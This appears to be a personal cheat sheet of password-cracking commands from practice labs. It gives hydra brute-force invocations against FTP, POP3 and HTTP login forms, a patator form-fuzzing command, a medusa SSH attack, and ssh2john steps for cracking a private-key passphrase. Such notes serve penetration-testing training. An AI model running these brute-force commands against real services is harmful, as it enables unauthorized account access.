# Password Cracking

## FTP
`hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.135.19`

## POP
`hydra -l miles -P /usr/share/wordlists/rockyou.txt -f 10.10.102.21 pop3 -V`

## HTTP 
hydra - remember to test the final page if redirected
`hydra -l manager -P /usr/share/wordlists/rockyou.txt 10.10.65.251 http-post-form "/content/as?type=signin&timeStamp=1637967506085:user=^USER^&passwd=^PASS^:S=logout" -vV -f`

`hydra -l manager -P /usr/share/wordlists/rockyousingle.txt 10.10.55.197 http-post-form "/content/as?type=signin&timeStamp=1637967506085:user=^USER^&passwd=^PASS^:S=Database mysql Connected" -vV -f`
Add headers like this -  :H=Origin\: http\://10.10.91.103:H=Accept\: */*:H=Content-Type\: application/x-www-form-urlencoded
S - success, F - fail - json may need escaping - F={\"status\"\:0,\"statusInfo\"\:\"Login failed\"}

patator - here, follow = 0 so that redirect is not followed and we can grep on JSON - no need to escape special chars in JSON
`patator http_fuzz url='http://10.10.55.197/content/as/?type=signin&timeStamp=1638482840080'  method=POST follow=0 accept_cookie=1 body='user=manager&passwd=FILE0&server=1&lang=en' 0=/usr/share/wordlists/rockyousingle.txt  -x ignore:fgrep='"status":1,"statusInfo":"Login success"'`

## SSH
Medusa
`medusa -M ssh -h 10.10.238.159 -u itguy -P "/usr/share/wordlists/rockyou.txt"`

## RSA private key passphrase
`wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/ssh2john.py`
`python ssh2john.py keyfile > keyfile.hash`
`ssh -i keyfile user@x.x.x.x`